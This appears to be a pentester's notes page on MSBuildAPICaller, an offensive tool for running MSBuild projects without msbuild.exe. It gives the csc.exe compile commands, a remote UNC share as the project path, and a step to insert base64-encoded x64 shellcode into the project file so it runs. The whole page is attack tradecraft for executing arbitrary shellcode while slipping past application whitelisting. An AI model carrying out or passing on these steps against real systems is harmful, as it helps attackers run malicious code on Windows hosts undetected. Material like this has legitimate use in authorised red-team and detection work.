---
description: MSBuild Without MSBuild.exe
---

# MSBuildAPICaller

Link: [https://github.com/rvrsh3ll/MSBuildAPICaller](https://github.com/rvrsh3ll/MSBuildAPICaller)

## How to build and execute

**Step 1: Build IEShim.cs**

`C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.Tasks.v4.0.dll";"Microsoft.Build.Utilities.v4.0.dll" /target:library IEShim.cs`

**Step 2**: Change ProjectPath

Modify "projectPath" variable on line 60 of msbuildapicaller.cs to your needs

Example: `string projectPath = '\\192.168.1.100\share\msbuildapicaller.csproj';`

**Step 3:** Add shellcode

Replace with your base64 encoded x64 shellcode in msbuildapicaller.csproj

**Step 4:** Change variable

Replace AssemblyFile variable with the location of your compiled dll from step 1

**Step 5:** Build msbuildapicaller.cs

`C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.dll";"Microsoft.Build.Engine.dll";"Microsoft.Build.Utilities.v4.0.dll";"System.Runtime.dll" /target:exe msbuildapicaller.cs`

### 

Step 6: Execute msbuildapicaller.exe



